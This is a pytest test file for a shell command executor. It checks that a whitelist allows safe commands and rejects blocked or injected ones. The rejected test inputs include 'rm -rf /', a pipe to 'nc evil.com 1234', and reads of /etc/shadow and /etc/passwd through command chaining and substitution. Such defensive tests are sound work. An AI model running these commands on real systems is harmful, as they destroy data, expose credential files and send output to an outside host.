import shutil
import sys

import pytest
from app.core.shell_executor import ShellExecutor
from app.exceptions import AuthorizationError

# Use the Python executable name that actually works on this platform
_PYTHON = "python3" if shutil.which("python3") and sys.platform != "win32" else "python"


@pytest.fixture
def executor():
    return ShellExecutor(whitelist=["ls", "echo", "cat", "whoami", "python3", "python", "git", "pip"])


def test_validate_command_allowed(executor):
    assert executor.validate_command("ls -la /home") is True


def test_validate_command_blocked(executor):
    with pytest.raises(AuthorizationError, match="not in whitelist"):
        executor.validate_command("rm -rf /")


def test_validate_command_injection_semicolon(executor):
    with pytest.raises(AuthorizationError, match="injection"):
        executor.validate_command("ls; rm -rf /")


def test_validate_command_injection_pipe(executor):
    with pytest.raises(AuthorizationError, match="injection"):
        executor.validate_command("ls | nc evil.com 1234")


def test_validate_command_injection_ampersand(executor):
    with pytest.raises(AuthorizationError, match="injection"):
        executor.validate_command("ls && cat /etc/shadow")


def test_validate_command_injection_backtick(executor):
    with pytest.raises(AuthorizationError, match="injection"):
        executor.validate_command("echo `whoami`")


def test_validate_command_injection_dollar(executor):
    with pytest.raises(AuthorizationError, match="injection"):
        executor.validate_command("echo $(cat /etc/passwd)")


def test_validate_command_empty(executor):
    with pytest.raises(AuthorizationError):
        executor.validate_command("")


def test_validate_command_with_args(executor):
    assert executor.validate_command("git status") is True
    assert executor.validate_command("pip install flask") is True


@pytest.mark.anyio
async def test_execute_simple_command(executor):
    result = await executor.execute("echo hello")
    assert result["exit_code"] == 0
    assert "hello" in result["stdout"]


@pytest.mark.anyio
async def test_execute_blocked_command(executor):
    with pytest.raises(AuthorizationError):
        await executor.execute("rm -rf /tmp")


@pytest.mark.anyio
async def test_execute_returns_stderr(executor):
    # Use __import__ to avoid semicolons (which trigger injection detection)
    result = await executor.execute(f'{_PYTHON} -c "__import__(\'sys\').stderr.write(\'err\')"')
    assert "err" in result["stderr"]


@pytest.mark.anyio
async def test_execute_nonzero_exit(executor):
    result = await executor.execute(f"{_PYTHON} -c \"exit(1)\"")
    assert result["exit_code"] == 1
